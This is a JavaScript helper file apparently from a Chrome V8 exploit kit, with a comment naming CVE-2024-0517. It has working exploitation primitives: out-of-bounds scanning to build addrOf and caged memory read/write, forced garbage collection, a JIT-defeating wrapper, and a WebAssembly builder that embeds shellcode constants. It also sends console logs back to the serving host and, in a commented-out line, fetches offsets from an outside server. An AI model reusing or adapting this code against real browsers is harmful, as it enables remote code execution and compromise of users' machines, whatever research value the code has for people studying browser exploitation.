const conid = Math.floor(Math.random() * 1000000);
const _consolelog = console.log;
console.log = async (...msg) => {
    _consolelog(...msg);
    if (typeof document !== 'undefined') {
        let d = document.getElementById('log');
        if (d) {
            d.innerText += msg.join(' ') + '\n';
        }

        if (window.location.search.indexOf(`nolog`) == -1) {
            try {
                let m = encodeURIComponent(`id[${conid}]: ${msg.join(' ')}`);
                return await fetch(`/?msg=${m}`).catch(() => {});
                // let i = document.createElement('img');
                // return await new Promise(r => {
                //     i.onload = i.onerror = r;
                //     i.src = `/?msg=${m}`;
                //     document.body.appendChild(i);
                // });
            }
            catch(e) {
                return;
            }
        }
    }
}

// # Utility functions

function init(offsets, version_hint) {
    let target_version = version_hint || (typeof navigator != 'undefined' ? navigator.userAgent.match(/Chrome.([^ ]+)/)?.[1] : null) || (typeof version != 'undefined' ? version() : '');
    let resulting_offsets = { ...offsets, version: target_version };
    let version_offsets = {...offsets};
    for (let x of target_version.toString().split(".")) {
        version_offsets = version_offsets[x] || {};
        for (let key of Object.keys(version_offsets)) {
            resulting_offsets[key] = version_offsets[key];
        }
    }

    // Check for updated version offsets
    let exploit = window.location.href.match(/.*(CVE-[0-9-]+)?/i)?.[0];
    // fetch(`https://offsets.webhooks.pw/exploit/chrome/CVE-2024-0517/offsets.json?version=${version_hint}&exploit=${exploit}`)
    // .then((response) => { if (ok) return response.json(); return {}; })
    // .then((data) => {
    //     for (let key of Object.keys(data)) {
    //         version_offsets[key] = data[key];
    //     }
    // });
    return resulting_offsets;
}

let references = [];
let arr_buf = new ArrayBuffer(8);
let f64_arr = new Float64Array(arr_buf);
let b64_arr = new BigInt64Array(arr_buf);

function ftoi(f) {
    f64_arr[0] = f;
    return b64_arr[0];
}

function itof(i) {
    b64_arr[0] = i;
    return f64_arr[0];
}

function to_hex(val, width = 16) {
    let _v = typeof val == 'bigint' ? val : (Number.isSafeInteger(val) ? BigInt(val) : ftoi(val));
    _v = _v >= 0 ? _v : 0x10000000000000000n + _v;
    return '0x' + _v.toString(16).padStart(width, '0');
}

function hold_reference(obj) {
    references.push(obj);
}

function mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
}

function scavenge_gc() {
    for (let i = 0; i < 8; i++) {
        // fill up new space external backing store bytes
        hold_reference(new ArrayBuffer(0x200000));
    }
    hold_reference(new ArrayBuffer(8));
}

function clean_gc() {
    scavenge_gc();
    scavenge_gc();
    mark_sweep_gc();
    mark_sweep_gc();
}

function noOpt(func) {
    let counter = 0;
    const wrapper = (...args) => {
        // Function stub to prevent JIT optimization
        counter += 1;
        if (counter % 10 == 1) {
            wrapper.stub = eval(func.toString() + `// ${counter}`);
        }
        
        return wrapper.stub(...args);
    };
    return wrapper;
}

function generate(builder, vals, mark = 0xccccccccccccccccn) {
    builder.addFunction("shellcode", makeSig([kWasmI64], [kWasmI64])).exportFunc().addBody([
        kExprI64Const, ...wasmSignedLeb64((mark & 0x8000000000000000n) > 0n ? mark - 0x10000000000000000n : mark),
        kExprLocalGet, 0,
        kExprI64Shl,
  
        ...vals.flatMap(v => {
          return [
            kExprI64Const, ...wasmSignedLeb64((v & 0x8000000000000000n) > 0n ? v - 0x10000000000000000n : v),
            kExprI64Xor,
          ];
        }),
  
        kExprI64Const, 1,
        kExprI64Ior,
    ]);
    return builder;
}

function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

function cleanShellcodeOutput(data) {
    function cleanRec(e) {
        if (e.length === 0) return [];
       
        let nullCount = (e.match(/\0/g) || []).length;
        // If there are no null bytes, return the string
        if (nullCount === 0) return [e];
        // If it's a wide char string, return the string without null bytes
        if (nullCount == (e.length - 1) / 2) return [e.replace(/\0/g, '')];

        // If there are null bytes, split the string and clean each part
        let sep = e.indexOf('\0\0') !== -1 ? '\0\0' : '\0';
        let part1 = e.split(sep, 1)[0];
        let part2 = e.slice(part1.length + sep.length);
        return [...cleanRec(part1), ...cleanRec(part2)];
    }
    return cleanRec(data.replace(/\0+$/, ''));
}

function scan_obj_primitives(oob_arr, obj_arr) {
    // Create an addrOf primitive, by scanning through an OOB buffer for the obj_arr array,
    // searching for the object reference in the array. When a reference candidate is found,
    // return a function that can be used to leak the object address
    obj_arr[0] = obj_arr[1] = obj_arr[2] = obj_arr[3] = obj_arr[4] = obj_arr[5] = {};

    let last = null;
    for (let x = 0; x < oob_arr.length; x++) {
        if (oob_arr[x] == last) {
            let val = oob_arr[x-1];
            obj_arr[0] = obj_arr[1] = {};
            if (oob_arr[x-1] != val) {
                return {
                    addrOf: (obj) => {
                        obj_arr[2] = obj_arr[3] = obj;
                        return ftoi(oob_arr[x]) & 0xffffffffn;
                    }
                };
            }

            obj_arr[0] = obj_arr[1] = obj_arr[2];
        }
        last = oob_arr[x];
    }

    throw 'addrOf primitive not found';
}
  
function scan_crw_primitives(oob_arr, crw_arr) {
    // Create cagedRead/Write primitives, by scaning through an OOB buffer for the 
    // crw_arr array, searching for the array length in both high and low dwords. 
    // When a length candidate is found, cange the crw_arr length and recheck the
    // candidate to confirm
    for (let x = 0; x < oob_arr.length; x++) {
        let value = ftoi(oob_arr[x]);
        // Check both the high and low dwords
        for (let shift of [0n, 32n]) {
            if (((value >> shift) & 0xffffffffn) == BigInt(crw_arr.length << 1)) {
                // Increase the length and read candidate again
                crw_arr.push(1.1);
                if (((ftoi(oob_arr[x]) >> shift) & 0xffffffffn) == BigInt(crw_arr.length << 1)) {
                    let elements_index = shift ? x : x - 1;
                    let elements_shift = shift ? 0n : 32n;
                    return {
                        elements_index,
                        elements_shift,
                        cagedRead: (addr) => {
                            let old = oob_arr[elements_index];
                            
                            oob_arr[elements_index] = itof(
                                ((addr - 8n) << elements_shift) | 
                                (ftoi(old) & (elements_shift ? 0x00000000ffffffffn : 0xffffffff00000000n))
                            );
    
                            let result = ftoi(crw_arr[0]);
                            oob_arr[elements_index] = old;
                            return result;
                        },
                        cagedWrite: (addr, value) => {
                            let old = oob_arr[elements_index];
                            
                            oob_arr[elements_index] = itof(
                                ((addr - 8n) << elements_shift) | 
                                (ftoi(old) & (elements_shift ? 0x00000000ffffffffn : 0xffffffff00000000n))
                            );
    
                            crw_arr[0] = itof(value);
                            oob_arr[elements_index] = old;
                        }
                    };
                }
            }
        }
    }
    throw 'Caged Read / Write primitives not found';
}
